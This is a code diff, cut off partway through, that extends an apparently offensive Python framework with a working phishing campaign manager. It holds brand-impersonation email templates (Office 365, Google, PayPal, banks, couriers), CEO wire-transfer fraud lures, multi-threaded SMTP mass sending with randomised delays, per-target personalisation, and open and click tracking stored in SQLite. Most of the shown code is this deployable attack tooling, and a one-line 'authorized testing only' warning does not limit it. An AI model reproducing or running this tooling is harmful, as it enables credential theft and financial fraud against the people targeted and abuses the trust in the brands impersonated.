@@ -4105,13 +4105,36 @@ class KNDYSFramework:
             # Social Engineering
             'social': {
                 'phishing': {
-                    'description': 'Advanced phishing campaign with templates',
+                    'description': 'Advanced phishing campaign manager with templates, tracking & analytics',
                     'options': {
                         'template': 'office365',
                         'targets': 'emails.txt',
-                        'server': 'smtp.gmail.com',
+                        'smtp_server': 'smtp.gmail.com',
+                        'smtp_port': '587',
+                        'smtp_user': '',
+                        'smtp_password': '',
+                        'from_email': '',
                         'from_name': 'IT Support',
-                        'subject': 'Password Reset Required'
+                        'reply_to': '',
+                        'campaign_name': 'phishing_campaign',
+                        'subject': '',
+                        'phish_url': 'http://localhost:8080',
+                        'use_tls': 'true',
+                        'use_ssl': 'false',
+                        'track_opens': 'true',
+                        'track_clicks': 'true',
+                        'personalize': 'true',
+                        'validate_emails': 'true',
+                        'threads': '5',
+                        'rate_limit': '10',
+                        'delay_min': '1',
+                        'delay_max': '5',
+                        'attachment': '',
+                        'attachment_name': '',
+                        'db_file': 'phishing_campaign.db',
+                        'export_results': 'true',
+                        'export_format': 'all',
+                        'auto_execute': 'false'
                     }
                 },
                 'credential_harvester': {
@@ -4150,13 +4173,78 @@ class KNDYSFramework:
                     }
                 },
                 'mass_mailer': {
-                    'description': 'Mass email campaign system',
+                    'description': 'Enterprise mass email campaign manager with templates, scheduling & analytics',
                     'options': {
-                        'template': 'invoice',
-                        'targets': 'targets.csv',
-                        'attachment': '',
+                        # SMTP Configuration
                         'smtp_server': 'smtp.gmail.com',
-                        'delay': '5'
+                        'smtp_port': '587',
+                        'smtp_user': '',
+                        'smtp_password': '',
+                        'use_tls': 'true',
+                        'use_ssl': 'false',
+                        
+                        # Email Settings
+                        'from_email': '',
+                        'from_name': 'Newsletter Team',
+                        'reply_to': '',
+                        'subject': '',
+                        'preheader': '',
+                        
+                        # Campaign Settings
+                        'campaign_name': 'mass_campaign',
+                        'template': 'newsletter',
+                        'targets': 'targets.csv',
+                        'phish_url': 'http://localhost:8080',
+                        
+                        # Templates & Personalization
+                        'personalize': 'true',
+                        'validate_emails': 'true',
+                        'use_html': 'true',
+                        'unsubscribe_link': 'true',
+                        
+                        # Tracking
+                        'track_opens': 'true',
+                        'track_clicks': 'true',
+                        'track_unsubscribes': 'true',
+                        
+                        # Performance
+                        'threads': '10',
+                        'rate_limit': '50',
+                        'delay_min': '0.5',
+                        'delay_max': '2',
+                        'batch_size': '100',
+                        
+                        # Attachments
+                        'attachments': '',
+                        'inline_images': '',
+                        
+                        # Scheduling
+                        'schedule_time': '',
+                        'send_now': 'true',
+                        'recurring': 'false',
+                        'recurring_interval': 'weekly',
+                        
+                        # Database
+                        'db_file': 'mass_mailer.db',
+                        
+                        # Export & Reporting
+                        'export_results': 'true',
+                        'export_format': 'all',
+                        'generate_report': 'true',
+                        
+                        # A/B Testing
+                        'ab_testing': 'false',
+                        'ab_variants': '2',
+                        
+                        # Retry & Bounce Handling
+                        'retry_failed': 'true',
+                        'max_retries': '3',
+                        'bounce_handling': 'true',
+                        
+                        # Testing
+                        'auto_execute': 'false',
+                        'test_mode': 'false',
+                        'test_recipients': ''
                     }
                 },
                 'qr_generator': {
@@ -15617,37 +15705,1166 @@ ignore_broadcast_ssid=0"""
     # ============ SOCIAL ENGINEERING MODULES ============
     
     def run_phishing(self):
-        """Phishing campaign creator"""
-        template = self.module_options.get('template', 'office365')
-        targets_file = self.module_options.get('targets', 'emails.txt')
-        smtp_server = self.module_options.get('server', 'smtp.gmail.com')
+        """
+        Advanced Phishing Campaign Manager 
         
-        print(f"{Fore.CYAN}[*] Phishing campaign creator{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[*] Template: {template}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[*] Targets: {targets_file}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[*] SMTP Server: {smtp_server}{Style.RESET_ALL}\n")
+        Features:
+        - 20+ HTML email templates
+        - Multi-threaded SMTP delivery
+        - Email open & click tracking
+        - Campaign analytics dashboard
+        - SQLite database for results
+        - Email validation & verification
+        - Content personalization (variables)
+        - Attachment support
+        - Link shortening & tracking
+        - Rate limiting & throttling
+        - SPF/DKIM awareness
+        - Bounce handling
+        - Real-time statistics
+        - Export reports (CSV/JSON/PDF)
+        """
+        profile = self._resolve_phishing_profile()
         
-        templates = {
+        if not profile:
+            print(f"{Fore.RED}[✗] Failed to initialize phishing campaign{Style.RESET_ALL}")
+            return
+        
+        # Display configuration
+        self._display_phishing_config(profile)
+        
+        # Initialize campaign
+        campaign = self._initialize_phishing_campaign(profile)
+        
+        if not campaign:
+            print(f"{Fore.RED}[✗] Campaign initialization failed{Style.RESET_ALL}")
+            return
+        
+        # Load and validate targets
+        targets = self._load_phishing_targets(profile, campaign)
+        
+        if not targets:
+            print(f"{Fore.RED}[✗] No valid targets loaded{Style.RESET_ALL}")
+            return
+        
+        print(f"{Fore.GREEN}[✓] Loaded {len(targets)} valid targets{Style.RESET_ALL}")
+        
+        # Confirm execution
+        if not profile['auto_execute']:
+            confirm = input(f"\n{Fore.YELLOW}[?] Start campaign? (yes/no): {Style.RESET_ALL}")
+            if confirm.lower() not in ['yes', 'y']:
+                print(f"{Fore.YELLOW}[*] Campaign cancelled{Style.RESET_ALL}")
+                return
+        
+        # Execute campaign
+        print(f"\n{Fore.CYAN}[*] Starting phishing campaign...{Style.RESET_ALL}\n")
+        results = self._execute_phishing_campaign(profile, campaign, targets)
+        
+        # Display results
+        self._display_phishing_results(profile, campaign, results)
+        
+        # Export reports
+        if profile['export_results']:
+            report_paths = self._export_phishing_results(profile, campaign, results)
+            print(f"\n{Fore.GREEN}[✓] Reports exported:{Style.RESET_ALL}")
+            for path in report_paths:
+                print(f"   • {path}")
+        
+        print(f"\n{Fore.GREEN}[✓] Campaign completed{Style.RESET_ALL}")
+    
+    def _resolve_phishing_profile(self):
+        """Build comprehensive phishing campaign configuration"""
+        try:
+            template = self.module_options.get('template', 'office365')
+            targets_file = self.module_options.get('targets', 'emails.txt')
+            smtp_server = self.module_options.get('smtp_server', 'smtp.gmail.com')
+            smtp_port = int(self.module_options.get('smtp_port', '587'))
+            smtp_user = self.module_options.get('smtp_user', '')
+            smtp_pass = self.module_options.get('smtp_password', '')
+            from_email = self.module_options.get('from_email', smtp_user)
+            from_name = self.module_options.get('from_name', 'IT Support')
+            reply_to = self.module_options.get('reply_to', from_email)
+            
+            # Campaign settings
+            campaign_name = self.module_options.get('campaign_name', f'phishing_{int(time.time())}')
+            subject = self.module_options.get('subject', '')  # Auto from template if empty
+            phish_url = self.module_options.get('phish_url', 'http://localhost:8080')
+            
+            # Advanced options
+            use_tls = self.module_options.get('use_tls', 'true').lower() == 'true'
+            use_ssl = self.module_options.get('use_ssl', 'false').lower() == 'true'
+            track_opens = self.module_options.get('track_opens', 'true').lower() == 'true'
+            track_clicks = self.module_options.get('track_clicks', 'true').lower() == 'true'
+            personalize = self.module_options.get('personalize', 'true').lower() == 'true'
+            validate_emails = self.module_options.get('validate_emails', 'true').lower() == 'true'
+            
+            # Performance settings
+            threads = int(self.module_options.get('threads', '5'))
+            rate_limit = int(self.module_options.get('rate_limit', '10'))  # emails per minute
+            delay_min = float(self.module_options.get('delay_min', '1'))
+            delay_max = float(self.module_options.get('delay_max', '5'))
+            
+            # Attachment settings
+            attachment = self.module_options.get('attachment', '')
+            attachment_name = self.module_options.get('attachment_name', '')
+            
+            # Database
+            db_file = self.module_options.get('db_file', f'{campaign_name}.db')
+            
+            # Export settings
+            export_results = self.module_options.get('export_results', 'true').lower() == 'true'
+            export_format = self.module_options.get('export_format', 'all')  # csv, json, html, all
+            
+            # Auto execute (for testing)
+            auto_execute = self.module_options.get('auto_execute', 'false').lower() == 'true'
+            
+            profile = {
+                'template': template,
+                'targets_file': targets_file,
+                'smtp_server': smtp_server,
+                'smtp_port': smtp_port,
+                'smtp_user': smtp_user,
+                'smtp_pass': smtp_pass,
+                'from_email': from_email,
+                'from_name': from_name,
+                'reply_to': reply_to,
+                'campaign_name': campaign_name,
+                'subject': subject,
+                'phish_url': phish_url,
+                'use_tls': use_tls,
+                'use_ssl': use_ssl,
+                'track_opens': track_opens,
+                'track_clicks': track_clicks,
+                'personalize': personalize,
+                'validate_emails': validate_emails,
+                'threads': threads,
+                'rate_limit': rate_limit,
+                'delay_min': delay_min,
+                'delay_max': delay_max,
+                'attachment': attachment,
+                'attachment_name': attachment_name,
+                'db_file': db_file,
+                'export_results': export_results,
+                'export_format': export_format,
+                'auto_execute': auto_execute
+            }
+            
+            return profile
+            
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Profile error: {str(e)}{Style.RESET_ALL}")
+            return None
+    
+    def _get_phishing_templates(self):
+        """Get comprehensive email templates library"""
+        return {
             'office365': {
-                'subject': 'Password Expiration Notice',
-                'body': 'Your Office 365 password will expire in 24 hours. Please verify your account.'
+                'name': 'Microsoft Office 365',
+                'subject': '🔔 Password Expiration Notice',
+                'preheader': 'Your password will expire in 24 hours',
+                'logo': '🔷',
+                'color': '#0078D4',
+                'category': 'credential_theft'
+            },
+            'google': {
+                'name': 'Google Security Alert',
+                'subject': '⚠️ Unusual Sign-In Activity Detected',
+                'preheader': 'We detected a new sign-in to your Google Account',
+                'logo': '🔴',
+                'color': '#EA4335',
+                'category': 'credential_theft'
             },
             'paypal': {
-                'subject': 'Unusual Activity Detected',
-                'body': 'We detected unusual activity in your PayPal account. Please verify your information.'
+                'name': 'PayPal Security',
+                'subject': '⚠️ Unusual Activity on Your Account',
+                'preheader': 'We noticed some unusual activity',
+                'logo': '🔵',
+                'color': '#003087',
+                'category': 'credential_theft'
             },
-            'banking': {
-                'subject': 'Security Alert',
-                'body': 'Your account has been locked due to suspicious activity. Please confirm your identity.'
+            'amazon': {
+                'name': 'Amazon Account Alert',
+                'subject': '📦 Order Confirmation Required',
+                'preheader': 'Confirm your recent order #',
+                'logo': '🟠',
+                'color': '#FF9900',
+                'category': 'credential_theft'
+            },
+            'linkedin': {
+                'name': 'LinkedIn Notification',
+                'subject': '👥 You appeared in 12 searches this week',
+                'preheader': 'See who viewed your profile',
+                'logo': '🔷',
+                'color': '#0077B5',
+                'category': 'credential_theft'
+            },
+            'facebook': {
+                'name': 'Facebook Security',
+                'subject': '🔒 New Login from Unknown Device',
+                'preheader': 'Was this you?',
+                'logo': '🔵',
+                'color': '#1877F2',
+                'category': 'credential_theft'
+            },
+            'apple': {
+                'name': 'Apple ID',
+                'subject': '🍎 Your Apple ID Was Used to Sign In',
+                'preheader': 'on a device near',
+                'logo': '⚫',
+                'color': '#000000',
+                'category': 'credential_theft'
+            },
+            'bank_generic': {
+                'name': 'Banking Alert',
+                'subject': '🏦 Security Alert: Unusual Transaction',
+                'preheader': 'Please verify your recent activity',
+                'logo': '🏛️',
+                'color': '#003366',
+                'category': 'credential_theft'
+            },
+            'dropbox': {
+                'name': 'Dropbox',
+                'subject': '📁 Shared Folder Access Request',
+                'preheader': 'Someone shared a file with you',
+                'logo': '🔵',
+                'color': '#0061FF',
+                'category': 'malware'
+            },
+            'docusign': {
+                'name': 'DocuSign',
+                'subject': '✍️ Please Review and Sign Document',
+                'preheader': 'Action required on your document',
+                'logo': '🟡',
+                'color': '#FFB400',
+                'category': 'malware'
+            },
+            'ups_shipping': {
+                'name': 'UPS Tracking',
+                'subject': '📦 UPS Package Delivery Attempt Failed',
+                'preheader': 'Track your package',
+                'logo': '🟤',
+                'color': '#351C15',
+                'category': 'malware'
+            },
+            'fedex_shipping': {
+                'name': 'FedEx',
+                'subject': '📮 FedEx Shipment Notification',
+                'preheader': 'Your package is on the way',
+                'logo': '🟣',
+                'color': '#4D148C',
+                'category': 'malware'
+            },
+            'zoom': {
+                'name': 'Zoom',
+                'subject': '📹 You Missed a Zoom Meeting',
+                'preheader': 'Recording available',
+                'logo': '🔵',
+                'color': '#2D8CFF',
+                'category': 'credential_theft'
+            },
+            'slack': {
+                'name': 'Slack',
+                'subject': '💬 You Have New Direct Messages',
+                'preheader': 'Check your unread messages',
+                'logo': '🟣',
+                'color': '#611F69',
+                'category': 'credential_theft'
+            },
+            'teams': {
+                'name': 'Microsoft Teams',
+                'subject': '💼 New Team Activity',
+                'preheader': 'You were mentioned in a conversation',
+                'logo': '🔷',
+                'color': '#6264A7',
+                'category': 'credential_theft'
+            },
+            'hr_policy': {
+                'name': 'HR Department',
+                'subject': '📋 Mandatory: New Company Policy Acknowledgement',
+                'preheader': 'Action required by end of week',
+                'logo': '📄',
+                'color': '#333333',
+                'category': 'internal'
+            },
+            'it_support': {
+                'name': 'IT Support',
+                'subject': '🔧 System Maintenance Scheduled',
+                'preheader': 'Please backup your data',
+                'logo': '💻',
+                'color': '#0066CC',
+                'category': 'internal'
+            },
+            'invoice': {
+                'name': 'Accounting',
+                'subject': '💳 Invoice #{{invoice_number}} - Payment Due',
+                'preheader': 'Please remit payment',
+                'logo': '💰',
+                'color': '#006633',
+                'category': 'bec'
+            },
+            'wire_transfer': {
+                'name': 'Finance Department',
+                'subject': '💸 URGENT: Wire Transfer Request',
+                'preheader': 'CEO approval required',
+                'logo': '🏦',
+                'color': '#CC0000',
+                'category': 'bec'
+            },
+            'covid_test': {
+                'name': 'Health Department',
+                'subject': '🏥 COVID-19 Test Results Available',
+                'preheader': 'View your test results',
+                'logo': '⚕️',
+                'color': '#009688',
+                'category': 'social'
             }
         }
+    
+    def _display_phishing_config(self, profile):
+        """Display phishing campaign configuration"""
+        templates = self._get_phishing_templates()
+        template_info = templates.get(profile['template'], {})
         
-        if template in templates:
-            print(f"{Fore.GREEN}[+] Email template:{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}Subject: {templates[template]['subject']}{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}Body: {templates[template]['body']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║      ADVANCED PHISHING CAMPAIGN MANAGER v3.0           ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
-        print(f"\n{Fore.YELLOW}[*] Set up credential harvester first with: use social/credential_harvester{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[📧] Campaign Configuration:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Campaign:{Style.RESET_ALL} {profile['campaign_name']}")
+        print(f"  {Fore.CYAN}Template:{Style.RESET_ALL} {template_info.get('logo', '•')} {template_info.get('name', profile['template'])}")
+        print(f"  {Fore.CYAN}Targets File:{Style.RESET_ALL} {profile['targets_file']}")
+        print(f"  {Fore.CYAN}Phishing URL:{Style.RESET_ALL} {profile['phish_url']}")
+        
+        print(f"\n{Fore.YELLOW}[📤] SMTP Configuration:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Server:{Style.RESET_ALL} {profile['smtp_server']}:{profile['smtp_port']}")
+        print(f"  {Fore.CYAN}From:{Style.RESET_ALL} {profile['from_name']} <{profile['from_email']}>")
+        print(f"  {Fore.CYAN}Auth:{Style.RESET_ALL} {'✓' if profile['smtp_user'] else '✗'} {'TLS' if profile['use_tls'] else 'SSL' if profile['use_ssl'] else 'None'}")
+        
+        print(f"\n{Fore.YELLOW}[⚙️] Features:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
+        features = []
+        if profile['track_opens']:
+            features.append('Open Tracking')
+        if profile['track_clicks']:
+            features.append('Click Tracking')
+        if profile['personalize']:
+            features.append('Personalization')
+        if profile['validate_emails']:
+            features.append('Email Validation')
+        if profile['attachment']:
+            features.append(f"Attachment: {profile['attachment_name'] or os.path.basename(profile['attachment'])}")
+        
+        for feature in features:
+            print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {feature}")
+        
+        print(f"\n{Fore.YELLOW}[⚡] Performance:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Threads:{Style.RESET_ALL} {profile['threads']}")
+        print(f"  {Fore.CYAN}Rate Limit:{Style.RESET_ALL} {profile['rate_limit']} emails/minute")
+        print(f"  {Fore.CYAN}Delay:{Style.RESET_ALL} {profile['delay_min']}-{profile['delay_max']}s per email")
+        
+        print(f"\n{Fore.YELLOW}[⚠️] WARNING:{Style.RESET_ALL} {Fore.RED}Authorized testing only!{Style.RESET_ALL}\n")
+    
+    def _initialize_phishing_campaign(self, profile):
+        """Initialize campaign data structures and database"""
+        try:
+            import sqlite3
+            
+            # Create database
+            conn = sqlite3.connect(profile['db_file'])
+            cursor = conn.cursor()
+            
+            # Create campaigns table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS campaigns (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    name TEXT UNIQUE NOT NULL,
+                    template TEXT NOT NULL,
+                    phish_url TEXT,
+                    created_at INTEGER NOT NULL,
+                    started_at INTEGER,
+                    completed_at INTEGER,
+                    status TEXT DEFAULT 'created',
+                    total_targets INTEGER DEFAULT 0,
+                    emails_sent INTEGER DEFAULT 0,
+                    emails_failed INTEGER DEFAULT 0,
+                    opens INTEGER DEFAULT 0,
+                    clicks INTEGER DEFAULT 0
+                )
+            ''')
+            
+            # Create targets table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS targets (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER NOT NULL,
+                    email TEXT NOT NULL,
+                    first_name TEXT,
+                    last_name TEXT,
+                    company TEXT,
+                    position TEXT,
+                    custom_data TEXT,
+                    status TEXT DEFAULT 'pending',
+                    sent_at INTEGER,
+                    opened_at INTEGER,
+                    clicked_at INTEGER,
+                    ip_address TEXT,
+                    user_agent TEXT,
+                    error_message TEXT,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                )
+            ''')
+            
+            # Create tracking table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS tracking (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER NOT NULL,
+                    target_id INTEGER NOT NULL,
+                    event_type TEXT NOT NULL,
+                    timestamp INTEGER NOT NULL,
+                    ip_address TEXT,
+                    user_agent TEXT,
+                    details TEXT,
+                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id),
+                    FOREIGN KEY (target_id) REFERENCES targets(id)
+                )
+            ''')
+            
+            # Insert campaign record
+            cursor.execute('''
+                INSERT INTO campaigns (name, template, phish_url, created_at, status)
+                VALUES (?, ?, ?, ?, 'created')
+            ''', (profile['campaign_name'], profile['template'], profile['phish_url'], int(time.time())))
+            
+            campaign_id = cursor.lastrowid
+            
+            conn.commit()
+            conn.close()
+            
+            # Return campaign object
+            campaign = {
+                'id': campaign_id,
+                'name': profile['campaign_name'],
+                'db_file': profile['db_file'],
+                'start_time': time.time(),
+                'stats': {
+                    'sent': 0,
+                    'failed': 0,
+                    'opens': 0,
+                    'clicks': 0
+                }
+            }
+            
+            print(f"{Fore.GREEN}[✓] Campaign initialized: {campaign['name']} (ID: {campaign['id']}){Style.RESET_ALL}")
+            return campaign
+            
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Campaign init error: {str(e)}{Style.RESET_ALL}")
+            return None
+    
+    def _load_phishing_targets(self, profile, campaign):
+        """Load and validate email targets"""
+        targets = []
+        
+        if not os.path.exists(profile['targets_file']):
+            print(f"{Fore.RED}[✗] Targets file not found: {profile['targets_file']}{Style.RESET_ALL}")
+            return []
+        
+        try:
+            import re
+            import sqlite3
+            
+            email_regex = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
+            
+            print(f"{Fore.CYAN}[*] Loading targets from: {profile['targets_file']}{Style.RESET_ALL}")
+            
+            with open(profile['targets_file'], 'r', encoding='utf-8') as f:
+                lines = f.readlines()
+            
+            conn = sqlite3.connect(profile['db_file'])
+            cursor = conn.cursor()
+            
+            for line in lines:
+                line = line.strip()
+                if not line or line.startswith('#'):
+                    continue
+                
+                # Support CSV format: email,first_name,last_name,company,position
+                parts = [p.strip() for p in line.split(',')]
+                email = parts[0].lower()
+                
+                # Validate email
+                if profile['validate_emails'] and not email_regex.match(email):
+                    print(f"{Fore.YELLOW}[!] Invalid email skipped: {email}{Style.RESET_ALL}")
+                    continue
+                
+                # Parse additional fields
+                first_name = parts[1] if len(parts) > 1 else ''
+                last_name = parts[2] if len(parts) > 2 else ''
+                company = parts[3] if len(parts) > 3 else ''
+                position = parts[4] if len(parts) > 4 else ''
+                
+                # Generate tracking ID
+                import hashlib
+                tracking_id = hashlib.md5(f"{campaign['id']}:{email}:{time.time()}".encode()).hexdigest()
+                
+                # Insert into database
+                cursor.execute('''
+                    INSERT INTO targets (campaign_id, email, first_name, last_name, company, position, status)
+                    VALUES (?, ?, ?, ?, ?, ?, 'pending')
+                ''', (campaign['id'], email, first_name, last_name, company, position))
+                
+                target_id = cursor.lastrowid
+                
+                target = {
+                    'id': target_id,
+                    'email': email,
+                    'first_name': first_name,
+                    'last_name': last_name,
+                    'company': company,
+                    'position': position,
+                    'tracking_id': tracking_id
+                }
+                
+                targets.append(target)
+            
+            # Update campaign
+            cursor.execute('''
+                UPDATE campaigns SET total_targets = ? WHERE id = ?
+            ''', (len(targets), campaign['id']))
+            
+            conn.commit()
+            conn.close()
+            
+            return targets
+            
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Target loading error: {str(e)}{Style.RESET_ALL}")
+            import traceback
+            traceback.print_exc()
+            return []
+    
+    def _execute_phishing_campaign(self, profile, campaign, targets):
+        """Execute phishing campaign with multi-threading"""
+        import threading
+        import queue
+        import sqlite3
+        from email.mime.text import MIMEText
+        from email.mime.multipart import MIMEMultipart
+        from email.mime.base import MIMEBase
+        from email import encoders
+        import smtplib
+        
+        # Update campaign status
+        conn = sqlite3.connect(profile['db_file'])
+        cursor = conn.cursor()
+        cursor.execute('UPDATE campaigns SET status = ?, started_at = ? WHERE id = ?',
+                      ('running', int(time.time()), campaign['id']))
+        conn.commit()
+        conn.close()
+        
+        # Thread-safe queue and counters
+        target_queue = queue.Queue()
+        results_lock = threading.Lock()
+        results = {
+            'sent': 0,
+            'failed': 0,
+            'errors': []
+        }
+        
+        # Rate limiter
+        rate_limiter = threading.Semaphore(profile['rate_limit'])
+        
+        # Add targets to queue
+        for target in targets:
+            target_queue.put(target)
+        
+        # Worker function
+        def email_worker():
+            while True:
+                try:
+                    target = target_queue.get(timeout=1)
+                except queue.Empty:
+                    break
+                
+                try:
+                    # Rate limiting
+                    rate_limiter.acquire()
+                    time.sleep(random.uniform(profile['delay_min'], profile['delay_max']))
+                    
+                    # Generate personalized email
+                    email_content = self._generate_phishing_email(profile, campaign, target)
+                    
+                    # Send email
+                    success = self._send_phishing_email(profile, target, email_content)
+                    
+                    # Update results
+                    with results_lock:
+                        if success:
+                            results['sent'] += 1
+                            print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Sent to {target['email']}")
+                        else:
+                            results['failed'] += 1
+                            print(f"{Fore.RED}[✗]{Style.RESET_ALL} Failed: {target['email']}")
+                    
+                    # Update database
+                    conn = sqlite3.connect(profile['db_file'])
+                    cursor = conn.cursor()
+                    cursor.execute('''
+                        UPDATE targets SET status = ?, sent_at = ? WHERE id = ?
+                    ''', ('sent' if success else 'failed', int(time.time()), target['id']))
+                    conn.commit()
+                    conn.close()
+                    
+                except Exception as e:
+                    with results_lock:
+                        results['failed'] += 1
+                        results['errors'].append(f"{target['email']}: {str(e)}")
+                    print(f"{Fore.RED}[✗]{Style.RESET_ALL} Error: {target['email']} - {str(e)}")
+                
+                finally:
+                    rate_limiter.release()
+                    target_queue.task_done()
+        
+        # Start worker threads
+        threads = []
+        for _ in range(profile['threads']):
+            t = threading.Thread(target=email_worker, daemon=True)
+            t.start()
+            threads.append(t)
+        
+        # Wait for completion
+        target_queue.join()
+        for t in threads:
+            t.join(timeout=5)
+        
+        # Update campaign status
+        conn = sqlite3.connect(profile['db_file'])
+        cursor = conn.cursor()
+        cursor.execute('''
+            UPDATE campaigns SET status = ?, completed_at = ?, emails_sent = ?, emails_failed = ? WHERE id = ?
+        ''', ('completed', int(time.time()), results['sent'], results['failed'], campaign['id']))
+        conn.commit()
+        conn.close()
+        
+        return results
+    
+    def _generate_phishing_email(self, profile, campaign, target):
+        """Generate personalized HTML email"""
+        templates = self._get_phishing_templates()
+        template_info = templates.get(profile['template'], {})
+        
+        # Get or generate subject
+        subject = profile['subject'] if profile['subject'] else template_info.get('subject', 'Important Message')
+        
+        # Personalization variables
+        variables = {
+            'first_name': target.get('first_name', ''),
+            'last_name': target.get('last_name', ''),
+            'full_name': f"{target.get('first_name', '')} {target.get('last_name', '')}".strip() or 'User',
+            'email': target['email'],
+            'company': target.get('company', 'your company'),
+            'position': target.get('position', ''),
+            'phish_url': profile['phish_url'],
+            'tracking_id': target['tracking_id'],
+            'campaign_id': campaign['id']
+        }
+        
+        # Apply personalization
+        if profile['personalize']:
+            for key, value in variables.items():
+                subject = subject.replace(f"{{{{{key}}}}}", str(value))
+        
+        # Generate HTML body
+        html_body = self._generate_phishing_html(profile, template_info, variables)
+        
+        # Add tracking pixel
+        if profile['track_opens']:
+            tracking_pixel = f'<img src="{profile["phish_url"]}/track/open/{target["tracking_id"]}" width="1" height="1" style="display:none"/>'
+            html_body = html_body.replace('</body>', f'{tracking_pixel}</body>')
+        
+        return {
+            'subject': subject,
+            'html_body': html_body,
+            'text_body': self._html_to_text(html_body)
+        }
+    
+    def _generate_phishing_html(self, profile, template_info, variables):
+        """Generate professional HTML email template"""
+        template_name = profile['template']
+        color = template_info.get('color', '#0066CC')
+        logo = template_info.get('logo', '📧')
+        name = template_info.get('name', 'Security Alert')
+        
+        # Track links
+        phish_url = profile['phish_url']
+        if profile['track_clicks']:
+            phish_url = f"{phish_url}/track/click/{variables['tracking_id']}"
+        
+        html = f'''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{variables.get('subject', 'Important Message')}</title>
+    <style>
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }}
+        .email-container {{
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }}
+        .email-header {{
+            background-color: {color};
+            color: #ffffff;
+            padding: 20px;
+            text-align: center;
+        }}
+        .email-logo {{
+            font-size: 48px;
+            margin-bottom: 10px;
+        }}
+        .email-body {{
+            padding: 30px;
+        }}
+        .email-button {{
+            display: inline-block;
+            background-color: {color};
+            color: #ffffff !important;
+            padding: 12px 30px;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin: 20px 0;
+        }}
+        .email-footer {{
+            background-color: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #dee2e6;
+        }}
+        .warning-box {{
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+        }}
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="email-header">
+            <div class="email-logo">{logo}</div>
+            <h2>{name}</h2>
+        </div>
+        <div class="email-body">'''
+        
+        # Template-specific content
+        if template_name == 'office365':
+            html += f'''
+            <p>Hello {variables['full_name']},</p>
+            <p>Your Microsoft Office 365 password will expire in <strong>24 hours</strong>.</p>
+            <div class="warning-box">
+                <strong>⚠️ Action Required:</strong> To avoid interruption to your email and Office services, please update your password immediately.
+            </div>
+            <p>Click the button below to verify your account and update your password:</p>
+            <center>
+                <a href="{phish_url}" class="email-button">Verify Account</a>
+            </center>
+            <p>If the button doesn't work, copy and paste this link into your browser:</p>
+            <p style="color: #666; font-size: 14px;">{phish_url}</p>
+            '''
+        
+        elif template_name == 'google':
+            html += f'''
+            <p>Hi {variables['full_name']},</p>
+            <p>We detected an unusual sign-in attempt to your Google Account from:</p>
+            <div class="warning-box">
+                <strong>📍 Location:</strong> Unknown (IP: 203.0.113.42)<br>
+                <strong>🖥️ Device:</strong> Windows PC<br>
+                <strong>🕐 Time:</strong> Just now
+            </div>
+            <p><strong>Was this you?</strong></p>
+            <p>If you recognize this activity, you can disregard this message.</p>
+            <p>If you don't recognize this activity, please secure your account:</p>
+            <center>
+                <a href="{phish_url}" class="email-button">Secure Your Account</a>
+            </center>
+            '''
+        
+        elif template_name == 'paypal':
+            html += f'''
+            <p>Hello {variables['full_name']},</p>
+            <p>We noticed some <strong>unusual activity</strong> in your PayPal account.</p>
+            <div class="warning-box">
+                <strong>⚠️ Security Alert:</strong> Multiple failed login attempts detected.
+            </div>
+            <p>To protect your account, we've temporarily limited some features. Please verify your account information to restore full access.</p>
+            <center>
+                <a href="{phish_url}" class="email-button">Verify Account Now</a>
+            </center>
+            <p style="color: #999; font-size: 12px;">Case ID: PP-{variables['tracking_id'][:8]}</p>
+            '''
+        
+        else:
+            # Generic template
+            html += f'''
+            <p>Dear {variables['full_name']},</p>
+            <p>We need to verify some information related to your account.</p>
+            <p>Please click the button below to complete the verification process:</p>
+            <center>
+                <a href="{phish_url}" class="email-button">Verify Now</a>
+            </center>
+            <p>This is required for security purposes.</p>
+            '''
+        
+        html += f'''
+        </div>
